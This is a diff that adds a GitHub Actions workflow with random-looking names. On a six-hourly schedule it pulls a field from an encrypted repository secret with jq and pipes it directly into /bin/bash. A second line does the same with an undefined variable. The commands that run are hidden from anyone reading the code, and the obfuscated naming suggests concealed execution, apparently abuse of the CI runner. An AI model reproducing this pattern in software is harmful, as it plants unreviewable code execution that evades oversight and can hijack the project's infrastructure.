@@ -1,0 +1,19 @@
+name: liurushi6781
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '33 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: liurushi6781
+        env:
+          ad9553: ${{ secrets.ad9553 }}
+        run: |
+          echo $ad9553 | jq -r .q5942 | /bin/bash
+          echo $dh7788 | jq -r .iwghz6381 | /bin/bash
+
